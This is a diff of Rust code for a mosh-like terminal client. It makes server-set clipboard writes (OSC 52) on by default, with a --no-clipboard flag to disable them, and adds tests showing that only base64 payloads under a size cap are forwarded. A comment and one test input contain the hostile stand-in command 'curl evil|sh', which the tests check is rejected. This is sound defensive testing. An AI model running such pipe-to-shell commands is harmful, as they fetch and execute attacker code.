@@ -683,8 +683,9 @@ impl InputModes {
 pub(super) struct OutOfBand {
     /// Prepended to the title (and to an icon equal to it), as mosh's `[mosh] `; empty for none.
     title_prefix: String,
-    /// Whether the server may set the clipboard (`--clipboard`). Off by default: a hostile server
-    /// could swap a copied command for `curl evil|sh`.
+    /// Whether the server may set the clipboard: on unless `--no-clipboard`. A hostile server can
+    /// then replace what the user copied (a command for `curl evil|sh`), so only base64 within
+    /// the cap is forwarded, and the clipboard is never read.
     clipboard_enabled: bool,
     /// Whether the program set a title: until then the user's is left alone, after it even a reset
     /// to empty is mirrored (mosh's `title_initialized`).
@@ -923,26 +924,26 @@ mod tests {
     }
 
     #[test]
-    fn out_of_band_clipboard_off_by_default_emits_nothing() {
-        // A default OutOfBand must NOT forward a server-set clipboard — no OSC 52 reaches the
-        // terminal even though the clipboard changed (the user never opted in).
-        let mut oob = OutOfBand::default();
+    fn out_of_band_clipboard_off_emits_nothing() {
+        // With clipboard writes off (`--no-clipboard`), no OSC 52 reaches the terminal even though
+        // the clipboard changed.
+        let mut oob = OutOfBand::default().with_clipboard(false);
         let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "aGVsbG8=", 0));
         assert!(
             !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
-            "no OSC-52 without explicit opt-in, got {:?}",
+            "no OSC-52 with clipboard writes off, got {:?}",
             String::from_utf8_lossy(&buf)
         );
     }
 
     #[test]
-    fn out_of_band_forwards_clipboard_when_opted_in() {
+    fn out_of_band_forwards_clipboard_when_on() {
         let mut oob = OutOfBand::default().with_clipboard(true);
         let scr = screen_of(b"");
         let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
         assert!(
             String::from_utf8_lossy(&buf).contains("\x1b]52;c;aGVsbG8=\x07"),
-            "clipboard OSC 52 forwarded when opted in"
+            "clipboard OSC 52 forwarded when on"
         );
         // Same clipboard again → not re-emitted.
         let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
@@ -950,8 +951,8 @@ mod tests {
     }
 
     #[test]
-    fn out_of_band_rejects_non_base64_clipboard_even_when_opted_in() {
-        // Even with the opt-in on, a non-base64 payload (e.g. raw shell injection) is dropped, not
+    fn out_of_band_rejects_non_base64_clipboard_even_when_on() {
+        // Even with clipboard writes on, a non-base64 payload (e.g. raw shell injection) is dropped, not
         // written verbatim to the terminal.
         let mut oob = OutOfBand::default().with_clipboard(true);
         let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "curl evil|sh", 0));
@@ -960,6 +961,18 @@ mod tests {
             "a non-base64 clipboard payload is rejected, got {:?}",
             String::from_utf8_lossy(&buf)
         );
+    }
+
+    #[test]
+    fn a_clipboard_query_or_an_oversized_payload_is_never_forwarded() {
+        // A query (`OSC 52 ; c ; ?`) would ask the user's terminal for their clipboard; it is not
+        // base64, so it never reaches the terminal, and nothing is ever asked of it.
+        let mut oob = OutOfBand::default().with_clipboard(true);
+        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "?", 0));
+        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
+        let huge = "A".repeat(MAXIMUM_CLIPBOARD_SIZE.saturating_add(4));
+        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", &huge, 0));
+        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
     }
 
     #[test]
